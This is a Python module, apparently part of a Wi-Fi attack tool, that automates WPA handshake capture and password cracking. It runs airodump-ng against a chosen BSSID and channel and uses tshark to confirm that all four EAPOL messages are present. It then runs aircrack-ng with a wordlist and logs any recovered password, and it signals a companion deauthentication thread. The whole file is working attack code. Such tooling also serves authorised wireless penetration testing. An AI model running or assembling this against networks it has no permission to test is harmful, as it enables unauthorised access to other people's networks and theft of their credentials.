# app/engine/capture_attack.py

import os
import re
import glob
import time
import subprocess

# Precompile ANSI escape matcher once (aircrack-ng emits cursor codes)
ANSI_ESCAPE_PATTERN = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
HANDSHAKE_MESSAGE_PATTERN = re.compile(r'Message\s+([1-4])\s+of\s+4', re.IGNORECASE)
REQUIRED_EAPOL_MESSAGES = {1, 2, 3, 4}


def _default_log(message):
    """Fallback log sink when no callback is injected (standalone / tests)."""
    print(message)


def parse_aircrack_password(raw_output):
    """
    Extract cracked password from aircrack-ng output.
    Returns the password string or None if not found.
    """
    if not raw_output:
        return None
    clean_output = ANSI_ESCAPE_PATTERN.sub('', raw_output)
    match = re.search(r'KEY FOUND!\s*\[([^\]]+)\]', clean_output)
    if match:
        return match.group(1).strip()
    return None


def has_full_wpa_handshake(tshark_output):
    """
    Returns (bool, set[int]) indicating whether all four WPA EAPOL messages are present.
    """
    if not tshark_output:
        return False, set()
    seen_messages = set()
    for match in HANDSHAKE_MESSAGE_PATTERN.findall(tshark_output):
        try:
            seen_messages.add(int(match))
        except ValueError:
            continue
    return REQUIRED_EAPOL_MESSAGES.issubset(seen_messages), seen_messages


# --- Capture and Crack Function (for Thread) ---
def capture_worker(target_bssid, target_channel, network_interface, timeout_duration,
                   capture_prefix, capture_filepath, wordlist_path, stop_signal, log=None):
    """Runs airodump-ng, checks for handshake, and attempts crack until stop_signal is set or handshake is cracked.

    ``log`` is an injected callback (message -> None); defaults to printing when absent.
    """
    log = log or _default_log
    base_capture_dir = "./captures/"
    safe_bssid_name = target_bssid.replace(":", "-")
    output_dir = os.path.join(base_capture_dir, safe_bssid_name)

    log(f"[Capture Thread] Starting capture for BSSID: {target_bssid} on channel {target_channel}")
    airodump_cmd_list = [
        'sudo', 'airodump-ng',
        '--bssid', target_bssid,
        '--channel', str(target_channel),
        '-w', capture_prefix,
        network_interface
    ]
    WPA_handshake_captured = False

    while not WPA_handshake_captured and not stop_signal.is_set():
        # --- Clean up old capture files (no shell; glob + remove) ---
        try:
            for stale_file in glob.glob(f"{capture_prefix}*"):
                try:
                    os.remove(stale_file)
                except OSError:
                    pass
        except Exception as e:
            log(f"[Capture Thread] Error during cleanup: {e}")

        # --- Run airodump-ng ---
        log(f"[Capture Thread] Running airodump-ng for {timeout_duration} seconds...")
        airodump_process = None
        try:
            airodump_process = subprocess.Popen(airodump_cmd_list, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) # Hide airodump output unless error needed
            # Wait for timeout, checking stop_signal
            start_time = time.monotonic()
            while time.monotonic() - start_time < timeout_duration:
                if stop_signal.wait(timeout=0.2): # Check stop signal every 0.2s
                     log("[Capture Thread] Stop signal received during airodump.")
                     break
            if airodump_process.poll() is None: # If process still running after loop/timeout
                log(f"[Capture Thread] airodump-ng timeout reached ({timeout_duration}s). Checking capture...")
                airodump_process.terminate()
                try:
                    airodump_process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    log("[Capture Thread] airodump-ng did not terminate gracefully, killing.")
                    airodump_process.kill()

        except FileNotFoundError:
            log("[Capture Thread] Error: 'airodump-ng' not found. Is aircrack-ng installed?")
            stop_signal.set()
            break
        except Exception as e:
            log(f"[Capture Thread] An unexpected error occurred running airodump-ng: {e}")
            if airodump_process and airodump_process.poll() is None:
                 try:
                     airodump_process.terminate()
                     airodump_process.kill()
                 except: pass # Ignore errors during cleanup kill
            stop_signal.set() # problem
            break
        finally:
             if airodump_process and airodump_process.poll() is None:
                 try:
                     airodump_process.terminate()
                     airodump_process.kill()
                 except: pass

        if stop_signal.is_set():
            break # Exit loop if stopped externally

        # --- Check for Handshake ---
        log(f"[Capture Thread] Checking for handshake in: {capture_filepath}")
        if not os.path.exists(capture_filepath):
            log(f"[Capture Thread] Capture file {capture_filepath} not found. Continuing scan...")
            time.sleep(2)
            continue

        try:
            tshark_command = ["tshark", "-r", capture_filepath, "-Y", "eapol"]
            result = subprocess.run(tshark_command, capture_output=True, text=True, check=True, timeout=20)
            output = result.stdout
            handshake_complete, seen_messages = has_full_wpa_handshake(output)
            if handshake_complete:
                WPA_handshake_captured = True
                log("[Capture Thread] ********** Handshake captured! **********")
                stop_signal.set() # Signal the deauth thread to stop

                # --- Attempt to Crack Handshake ---
                log(f"[Capture Thread] Attempting to crack {capture_filepath} with wordlist {wordlist_path}...")
                if not os.path.exists(wordlist_path):
                    log(f"[Capture Thread] Error: Wordlist not found at {wordlist_path}")
                    log("[Capture Thread] Cracking skipped.")
                else:
                    aircrack_command = [
                        # Note: aircrack-ng often doesn't need sudo if the script runner can read the cap file
                        # But if script is run with sudo, cap file might be root-owned, so keep sudo for consistency
                        'sudo',
                        'aircrack-ng',
                        '-w', wordlist_path,
                        '-b', target_bssid,
                        capture_filepath
                    ]
                    log(f"[Capture Thread] Running command: {' '.join(aircrack_command)}")
                    try:
                        # Run aircrack and let its output go to console
                        # Use check=False as non-zero exit code might mean "not found" rather than error
                        crack_result = subprocess.run(aircrack_command, check=False, text=True, capture_output=True)
                        print(f"[Capture Thread] aircrack-ng finished with exit code {crack_result.returncode}.")
                        password = parse_aircrack_password(crack_result.stdout)
                        if password:
                            log(f"[Capture Thread] Password found: {password}")
                        else:
                            log("[Capture Thread] Password not found in provided wordlist.")

                    except FileNotFoundError:
                        log("[Capture Thread] Error: 'aircrack-ng' command not found. Is aircrack-ng installed?")
                    except Exception as e:
                        log(f"[Capture Thread] An error occurred during aircrack-ng execution: {e}")
            else:
                missing = sorted(REQUIRED_EAPOL_MESSAGES - seen_messages)
                if missing:
                    log(f"[Capture Thread] Partial EAPOL exchange detected (missing {missing}) in {capture_filepath}. Retrying scan...")
                else:
                    log(f"[Capture Thread] No Handshake Found in {capture_filepath}. Retrying scan...")
                time.sleep(3)

        except subprocess.TimeoutExpired:
            log(f"[Capture Thread] tshark timed out checking {capture_filepath}. Retrying scan...")
            time.sleep(2)
        except subprocess.CalledProcessError as e:
            log(f"[Capture Thread] tshark failed checking {capture_filepath}. Error: {e.stderr}. Retrying scan...")
            time.sleep(3)
        except FileNotFoundError:
            log("[Capture Thread] Error: tshark not found. Please install Wireshark/tshark.")
            stop_signal.set()
            break
        except Exception as e:
            log(f"[Capture Thread] An error occurred during tshark check: {e}. Retrying scan...")
            time.sleep(3)

    log("[Capture Thread] Stopped.")
    if WPA_handshake_captured:
        log(f"[Capture Thread] Handshake capture/crack process complete. Files in: {output_dir}")
